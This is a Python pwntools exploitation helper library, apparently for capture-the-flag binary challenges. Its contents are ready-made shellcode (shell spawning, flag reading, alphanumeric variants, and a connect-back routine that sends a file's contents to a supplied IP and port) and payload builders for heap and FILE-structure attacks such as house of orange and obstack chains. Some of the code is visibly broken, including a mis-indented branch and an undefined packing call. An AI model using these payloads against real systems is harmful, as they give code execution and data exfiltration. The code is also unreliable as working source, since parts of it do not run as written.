from ast import arg
from pwn import *
from LibcSearcher import *
import sys
import os
import re
from subprocess import check_output
from collections import OrderedDict

def long_search(target_vul, leak_addr):
    obj = LibcSearcher(target_vul, leak_addr)
    libc_base = leak_addr - obj.dump(target_vul)
    sys_addr = libc_base + obj.dump('system')
    bin_sh_addr = libc_base + obj.dump('str_bin_sh')
    log('libc_base',hex(libc_base))
    log('sys_addr',hex(sys_addr))
    log('bin_sh_addr',hex(bin_sh_addr))
    return sys_addr, bin_sh_addr


def local_search(target_vul, leak_addr, libc):
    libc_base = leak_addr - libc.symbols[target_vul]
    sys_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + next(libc.search(b"/bin/sh"))
    log('libc_base', hex(libc_base))
    log('sys_addr',hex(sys_addr))
    log('bin_sh_addr',hex(bin_sh_addr))
    return sys_addr, bin_sh_addr

def log(message,value):
    print("\033["+"0;30;41m"+message+"\033[0m"+
          "\033["+str(91)+"m"+" ===============> "+
          "\033[0m","\033["+"0;30;43m"+value+"\033[0m")

def log_addr(message : str):
    assert isinstance(message,str),'The parameter passed in should be of type str'
    variable= sys._getframe(1).f_locals.get(message)
    assert isinstance(variable,int),'Variable should be of type int'
    log(message,hex(variable))
    
def log_info(message):
    print("\033[1;31m[\033[0m"+"\033[1;32m*\033[0m"+"\033[1;31m]\033[0m  ",message)  
    

def debug(p,*args):
    try:
        if len(sys.argv)==2:
            return
    except:
        pass
    if not args:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(p)
        os.system('tmux select-pane -L')
        os.system('tmux split-window')
        os.system('tmux set mouse on')
        return
    if args[0]=='no-tmux':
        if args[1]=='pie':
            list=[]
            for i in range(2,len(args)):
                demo = "b * $rebase(0x{:x})\n ".format(args[i])
                list.append(demo)
                info = "".join(list)
            gdb.attach(p, info)
        else:
            list=[]
            for i in range(1,len(args)):
                demo = "b * 0x{:x}\n ".format(args[i])
                list.append(demo)
            info = "".join(list)
            gdb.attach(p,info)
    else:
        if args[0]=='pie':
            list=[]
            for i in range(1,len(args)):
                demo = "b * $rebase(0x{:x})\n ".format(args[i])
                list.append(demo)
                info = "".join(list)
            context.terminal = ['tmux', 'splitw', '-h']
            gdb.attach(p,info)
            os.system('tmux select-pane -L')
            os.system('tmux split-window')
            os.system('tmux set mouse on')
        else:
            list=[]
            for i in range(len(args)):
                demo = "b * 0x{:x}\n ".format(args[i])
                list.append(demo)
            info = "".join(list)
            context.terminal = ['tmux', 'splitw', '-h']
            gdb.attach(p,info)
            os.system('tmux select-pane -L')
            os.system('tmux split-window')
            os.system('tmux set mouse on')

def load(program_name, ip_port="", remote_libc=""):

    global libc_info
    global p
    global framework

    framework = pretreatment_arch(program_name)#判断程序架构

    program_path = os.path.abspath(program_name)
    recv = os.popen('ldd ' + program_path).read()
    recv1 = os.popen('file ' + program_path).read()#考虑到用户的ldd返回信息可能是中文，所以这里接收一下file命令的返回值

    if "not a dynamic executable" in recv or "statically linked" in recv1:#判断是否为静态链接
        if ip_port == "":
            p = process('./' + program_name)
        else:
            if ":" in ip_port:
                par_list = ip_port.split(":", 1)
                p = remote(par_list[0], par_list[1])
                return p
            p = remote(ip_port)
        return p

    """如果程序是动态链接，那就去获取程序的libc信息"""
    rule_version = r"libc-2\.[0-9][0-9]\.so"
    version = re.findall(rule_version, recv)
    if version:
        rule_info = r"\t(.*?)" + version[0] + " \(0x"
        info = re.findall(rule_info, recv)
        libc_info = info[0] + version[0]
    else:
        rule_info = r"libc.so.6 => (.*?) \(0x"
        info = re.findall(rule_info, recv)
        libc_info = info[0]

    if remote_libc!="" and ip_port != "" and (len(sys.argv) == 2 and sys.argv[1] == str(1)):
        libc_info=remote_libc
    log('libc_info', libc_info)
    if len(sys.argv) == 1 or (len(sys.argv) == 2 and sys.argv[1] == str(2)):
        """如果打本地的话(命令行参数没有或者为2)，就返回如下"""
        p = process('./' + program_name)
        e = ELF('./' + program_name)
        libc = ELF(libc_info)
        return p, e, libc

    if ip_port != "" and (len(sys.argv) == 2 and sys.argv[1] == str(1)):
        """如果打远程的话(命令行参数为1)并且存在ip_port"""
        """再去判断是否存在远程的libc版本,如果有的话，就直接去装载对应的libc版本"""
        """这种情况是应对打远程和本地的小版本libc不一样的情况，比如one_gadget或者某些函数的偏移有细微差异，从而可以更快的去进行切换"""
        if ":" in ip_port:
            par_list = ip_port.split(":", 1)
            p = remote(par_list[0], par_list[1])
            e = ELF('./' + program_name)
            if remote_libc!="":
                libc=ELF(remote_libc)
            else:
                libc=ELF(libc_info)
            return p, e, libc


def shellcode_store(demand, *args):
    if demand == 'shell_64':
        shellcode = b"\x48\xC7\xC0\x3B\x00\x00\x00\x49\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x41\x50\x48\x31\xF6\x48\x31\xD2\x54\x5F\x0F\x05"
        return shellcode
    elif demand == 'shell_32':
        shellcode = b"\x31\xC9\x31\xD2\x31\xDB\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC0\x6A\x0B\x58\xCD\x80"
        return shellcode
    elif demand == 'orw1_64':
        shellcode = b"\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x6A\x00\x5F\x6A\x00\x5A\x68\x01\x01\x00\x00\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05"
        return shellcode
    elif demand == 'orw_64':
        shellcode = b"\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05"
        return shellcode
    elif demand == 'orw_32':
        shellcode = b"\x6A\x00\x68\x66\x6C\x61\x67\x54\x5B\x31\xC9\x6A\x05\x58\xCD\x80\x50\x5B\x54\x59\x6A\x50\x5A\x6A\x03\x58\xCD\x80\x6A\x01\x5B\x54\x59\x6A\x50\x5A\x6A\x04\x58\xCD\x80"
        return shellcode
    elif demand == 'str_rsp':
        shellcode = "Th0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
        return shellcode
    elif demand == 'str_esp':
        shellcode = "TYhffffk4diFkDql02Dqm0D1CuEE2O0Z2G7O0u7M041o1P0R7L0Y3T3C1l000n000Q4q0f2s7n0Y0X020e3j2r1k0h0i013A7o4y3A114C1n0z0h4k4r0y07"
        return shellcode
    elif demand == 'str_rdi':
        shellcode = "Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
        return shellcode
    elif demand == 'str_rsi':
        shellcode = "Vh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
        return shellcode
    elif demand == 'str_rax':
        shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
        return shellcode
    elif demand == 'str_rbp':
        shellcode = "Uh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
        return shellcode
    elif demand == 'str_rbx':
        shellcode = "Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
        return shellcode
    elif demand == 'str_rcx':
        shellcode = "Qh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
        return shellcode

elif demand=='reflag_64':
        socket = args[0]
        ip, port = socket.split()
        ip_hex = ''.join(reversed([hex(int(num))[2:].zfill(2) for num in ip.split('.')]))
        port_hex = hex(int(port))[2:].zfill(4)  # 将端口号转换为四位的十六进制字符串
        port_hex_split = [port_hex[i:i + 2] for i in range(0, len(port_hex), 2)]  # 按两个数字分割十六进制字符串
        port_hex = ''.join(reversed(port_hex_split))
        socket = "mov rbx," + "0x" + ip_hex + port_hex + "0002"
        context.arch = 'amd64'
        result =asm(socket)
        shellcode=b"\x6A\x02\x5F\x6A\x01\x5E\x48\x31\xD2\x6A\x29\x58\x0F\x05\x50\x5F\x6A\x10\x5A"+result+b"\x53\x54\x5E\x6A\x2A\x58\x0F\x05"
        shellcode+=b"\x57\x5B\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x53\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05"
        return shellcode

    else:
        assert False, "Pass in unrecognized parameter"


def search_og(index):
    global libc_info
    recv = os.popen('one_gadget '+libc_info).read()
    p1 = re.compile(r"(.*exec)")
    c = re.findall(p1,recv)
    log_info(recv)
    one_gadget_list=[int(i[:-5],16) for i in c ]
    return one_gadget_list[index]

def recv_libc(time=0):
    global p
    global framework
    if framework=='amd64':    
        if time == 0:
            recv_libc_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
            log_addr('recv_libc_addr')
        else:
            recv_libc_addr=u64(p.recvuntil(b'\x7f',timeout=time)[-6:].ljust(8,b'\x00'))
            log_addr('recv_libc_addr')
    if framework=='i386':
        if time == 0:
            recv_libc_addr=u32(p.recvuntil(b'\xf7')[-4:])
            log_addr('recv_libc_addr') 
        else:
            recv_libc_addr=u32(p.recvuntil(b'\xf7',Timeout=time)[-4:])
            log_addr('recv_libc_addr') 
    return recv_libc_addr       

def pretreatment_arch(program_name):
    """获取程序的位数"""
    global framework
    program_path = os.path.abspath(program_name)
    recv = os.popen('file ' + program_path).read()  # 执行file命令，来对获取的数据进行处理，以来判断程序的位数
    if '64-bit' in recv:
        framework = 'amd64'
    elif '32-bit' in recv:
        framework = 'i386'
    else:
        print('It may not be an ELF file, its type is {}'.format(recv))
        exit()
    log('The framework of the program is:',framework)
    return framework

def tcache_struct_attack(writes:list,address={}):
    """这个函数目前只适用于2.27的libc版本中"""
    """两个参数都为列表 第一个必须要有 第二个则可以没有"""
    """如果我们想将0x110这条tcache链的counts改成7,那我们将第一个参数写为{0x110:7}即可"""
    """第二个参数是用来篡改某条链表的头指针，比如篡改0x120这条链的头指针为0xdeadbeef 则写成{0x120:0xdeadbeef}"""
    count_list=[]
    payload=b''
    size=0x20
    i=0
    flag=0
    while(0x410>=size):
        if i==len(writes):
            break
        for key in writes:
            if size==key:
                count_list.append(writes[key].to_bytes(1,byteorder='little', signed=False))
                i=i+1
                flag=1  
        if flag==0:
            count_list.append((b'\x00'))
        size=size+0x10
        flag=0
    payload=b''.join(count_list)
    if address:
        payload.ljust(0x40,b'\x00')
        size=0x20
        i=0
        flag=0
        address_list=[]
        while(0x410>=size):
            if i==len(address):
                break
            for key in address:
                if size==key:
                    address_list.append(p(address[key]))
                    i=i+1
                    flag=1
            if flag==0:
                address_list.append(p(0))
            size=size+0x10
            flag=0
        payload=payload.join(address_list)
    return payload

def orange_attack(libc_base:int,heap_addr:int,fill_data,libc)->bytes:
    '''
    在house of orange攻击中，如果获取了libc地址和堆地址，并且让堆块进入unsorted bin中
    后续的攻击较为模板化，因此将后面的payload模板化
    使用该函数最需要注意的就是heap_addr必须要是在unsorted bin中的那个堆块地址

    :param libc_base: libc基地址
    :param heap_addr: 在unsorted bin中的堆块地址
    :param fill_data: 因为我们是溢出来控制的堆块数据，这个fill_data是覆盖正常堆块的数据
    假设正常堆块size为0x400，我们通过正常堆块溢出到它下面位于unsorted bin中的堆块，那么fill_data为0x400
    :param libc: 该参数就是程序所依赖的libc库，用于之后在libc中搜索需要的符号表
    :return: 构造好的payload
    '''
    sys_addr = libc_base + libc.symbols['system']
    io_list_all = libc_base + libc.symbols['_IO_list_all']

    payload = b'a' * fill_data
    payload += b'/bin/sh\x00' + p64(0x61)  # old top chunk prev_size & size 同时也是fake stdout的_flags字段
    payload += p64(0) + p64(io_list_all - 0x10)  # old top chunk fd & bk  覆盖bk，进行unsorted bin attack
    payload += p64(0) + p64(1)  # _IO_write_base & _IO_write_ptr
    payload += p64(0) * 7
    payload += p64(heap_addr)  # chain
    payload += p64(0) * 13
    payload += p64(heap_addr+0xd8) #vtable
    payload += p64(0) + p64(0) + p64(sys_addr)#sys_addr为 __overflow字段
    return payload



class create_dict(dict):
    """
    该类可以改变访问字典的方式，原本是需要用value['hello']来访问hello这个键的值
    现在可以直接用value.hello来访问hello对应的值

    传入的参数是要改变访问方式的字典名，返回值是改变后的字典名
    """
    def __getattr__(self, name):
        if name not in self.keys():
            return None
        return self[name]

    def __setattr__(self, name, value):
        self[name] = value
        
def obstack_attack(heap_addr:int,libc_symbol_address:dict)->bytes:
    '''
    传入的参数字典所需的符号为：system  io_obstack_jumps

    该io链似乎没有在House系列中有名字 姑且记为obstack_attack函数 该io链适用于glibc2.36及以下的攻击
    使用前提是泄露libc地址和堆地址 并且能任意地址写一个堆地址(最好是能往IO_list_all里写一个堆地址) 且能从main函数正常返回或者触发exit函数
    
    攻击效果是任意地址执行且rdi可控
    
    :param heap_addr:           伪造的IO_FILE结构体的chunk地址 (chunk头) (同时要把IO_list_all中写入这个chunk头的地址)
    :param libc_symbol_address: 传入进来的libc中符号地址的参数字典            
    
    :return: 构造好的payload

    '''
    io_file=p64(0)   #  io_read_end
    io_file+=p64(1)  # obstack->next_free
    io_file+=p64(0)  # io_write_base
    io_file+=p64(1)  # io_write_ptr
    io_file+=p64(0)  # io_write_end
    io_file+=p64(libc_symbol_address.system)  #rax
    io_file+=p64(0)  # _io_buf_end
    io_file+=p64(heap_addr+0xe8)  #rdi
    io_file+=p64(1)  # use_extra_arg
    io_file+=p64(0)*16
    io_file+=p64(libc_symbol_address.io_obstack_jumps+0x20)   #vtable
    io_file+=p64(heap_addr)   #obstack
    io_file+=b'/bin/sh\x00'
    return io_file


def obstack_orw1_attack(heap_addr:int,libc_symbols_address:list)->bytes:
    '''
    传入的参数字典所需的符号为：
    open;read;write 
    io_obstack_jumps;svcudp_reply;add_rsp 
    leave_ret;pop_rdi;pop_rsi;pop_rdx_xxx
    此处的pop_rdx_xxx的xxx，可以是任何寄存器（除了rdi,rsi,rax）
    此处的add_rsp是要将rsp加0x58（只要能保证rsp加0x58，用任何gadget都可以）

    该io链依然是obstack这条 该函数可以在开启沙箱后执行orw读取出flag

    :param heap_addr:           伪造的IO_FILE结构体的chunk地址 (chunk头) (同时要把IO_list_all中写入这个chunk头的地址)
    :param libc_symbol_address: 传入进来的libc中符号地址的参数字典            
    
    :return: 构造好的payload
    
    svcudp_reply:是svcudp_reply+26的地址如下 (注意：在glibc2.23和2.27的版本中应该是+22并非+26)
    <svcudp_reply+26>:    mov    rbp,QWORD PTR [rdi+0x48]
	<svcudp_reply+30>:    mov    rax,QWORD PTR [rbp+0x18]
	<svcudp_reply+34>:    lea    r13,[rbp+0x10]
	<svcudp_reply+38>:    mov    DWORD PTR [rbp+0x10],0x0
	<svcudp_reply+45>:    mov    rdi,r13
	<svcudp_reply+48>:    call   QWORD PTR [rax+0x28]
    '''

    flag=heap_addr+0x1f2
    io_file=p64(0)   #  io_read_end
    io_file+=p64(1)  # obstack->next_free
    io_file+=p64(0)  # io_write_base
    io_file+=p64(1)  # io_write_ptr
    io_file+=p64(0)  # io_write_end
    io_file+=p64(libc_symbols_address.svcudp_reply)  #rax
    io_file+=p64(0)  # _io_buf_end
    io_file+=p64(heap_addr+0xd8)  #rdi
    io_file+=p64(1)  # use_extra_arg    19+4=23
    io_file+=p64(0)*16
    io_file+=p64(libc_symbols_address.io_obstack_jumps+0x20)   #vtable
    io_file+=p64(heap_addr) #obstack         
    io_file+=p64(libc_symbols_address.add_rsp)      # ret
    io_file+=p64(0)  

    io_file+=p64(heap_addr+0xe0)                       #rax 
    io_file+=p64(0)
    io_file+=p64(libc_symbols_address.leave_ret)    #second call 
    io_file+=p64(0)*2
    io_file+=p64(heap_addr+0xe0)  #rbp
    io_file+=p64(libc_symbols_address.leave_ret)        



    orw=p64(0xdeadbeef)*3
    orw+=p64(libc_symbols_address.pop_rdi)+p64(flag)
    orw+=p64(libc_symbols_address.pop_rsi)+p64(0)
    orw+=p64(libc_symbols_address.open)
    orw+=p64(libc_symbols_address.pop_rdi)+p64(3)
    orw+=p64(libc_symbols_address.pop_rsi)+p64(heap_addr+0x200)
    orw+=p64(libc_symbols_address.pop_rdx_xxx)+p64(0x50)*2
    orw+=p64(libc_symbols_address.read)
    orw+=p64(libc_symbols_address.pop_rdi)+p64(1)
    orw+=p64(libc_symbols_address.pop_rsi)+p64(heap_addr+0x200)
    orw+=p64(libc_symbols_address.pop_rdx_xxx)+p64(0x50)*2
    orw+=p64(libc_symbols_address.write)
    orw+=b'./flag\x00\x00'
    return io_file+orw


def obstack_orw2_attack(heap_addr,libc_symbols_address)->bytes:
    '''
    传入的参数字典所需的符号为：
    openat;read;write;close
    io_obstack_jumps;svcudp_reply;add_rsp 
    leave_ret;pop_rdi;pop_rsi;pop_rdx_xxx

    该io链依然是obstack这条 该函数可以在开启沙箱后执行orw读取出flag 
    这次是将open换成了openat 并且有时远程需要先close掉标准输入 再open文件 因此本链将close和openat二者结合

    :param heap_addr:           伪造的IO_FILE结构体的chunk地址 (chunk头) (同时要把IO_list_all中写入这个chunk头的地址)
    :param libc_symbol_address: 传入进来的libc中符号地址的参数字典            
    

    :return: 构造好的payload
    
    svcudp_reply:是svcudp_reply+26的地址如下(注意：在glibc2.23和2.27的版本中应该是+22并非+26)
    <svcudp_reply+26>:    mov    rbp,QWORD PTR [rdi+0x48]
	<svcudp_reply+30>:    mov    rax,QWORD PTR [rbp+0x18]
	<svcudp_reply+34>:    lea    r13,[rbp+0x10]
	<svcudp_reply+38>:    mov    DWORD PTR [rbp+0x10],0x0
	<svcudp_reply+45>:    mov    rdi,r13
	<svcudp_reply+48>:    call   QWORD PTR [rax+0x28]
    '''

    flag=heap_addr+0x130
    io_file=p64(0)   #  io_read_end
    io_file+=p64(1)  # obstack->next_free
    io_file+=p64(0)  # io_write_base
    io_file+=p64(1)  # io_write_ptr
    io_file+=p64(0)  # io_write_end
    io_file+=p64(libc_symbols_address.svcudp_reply)  #rax
    io_file+=p64(0)  # _io_buf_end
    io_file+=p64(heap_addr+0xd8)  #rdi
    io_file+=p64(1)  # use_extra_arg    19+4=23
    io_file+=p64(0)*16
    io_file+=p64(libc_symbols_address.io_obstack_jumps+0x20)   #vtable
    io_file+=p64(heap_addr) #obstack         
    io_file+=p64(libc_symbols_address.add_rsp)      # ret
    io_file+=p64(0)  

    io_file+=p64(heap_addr+0xe0)                       #rax 
    io_file+=p64(0)
    io_file+=p64(libc_symbols_address.leave_ret)    #second call 
    io_file+=p64(0)*2
    io_file+=p64(heap_addr+0xe0)  #rbp
    io_file+=p64(libc_symbols_address.leave_ret)        


    orw=b'/flag\x00\x00\x00'
    orw+=p64(0xdeadbeef)*2
    orw+=p64(libc_symbols_address.pop_rdi)+p64(0)
    orw+=p64(libc_symbols_address.close)
    orw+=p64(libc_symbols_address.pop_rsi)+p64(flag)
    orw+=p64(libc_symbols_address.pop_rdx_xxx)+p64(0)*2
    orw+=p64(libc_symbols_address.openat)
    orw+=p64(libc_symbols_address.pop_rdi)+p64(0)
    orw+=p64(libc_symbols_address.pop_rsi)+p64(heap_addr)
    orw+=p64(libc_symbols_address.pop_rdx_xxx)+p64(0x50)*2
    orw+=p64(libc_symbols_address.read)
    orw+=p64(libc_symbols_address.pop_rdi)+p64(1)
    orw+=p64(libc_symbols_address.pop_rsi)+p64(heap_addr)
    orw+=p64(libc_symbols_address.pop_rdx_xxx)+p64(0x50)*2
    orw+=p64(libc_symbols_address.write)
    return io_file+orw
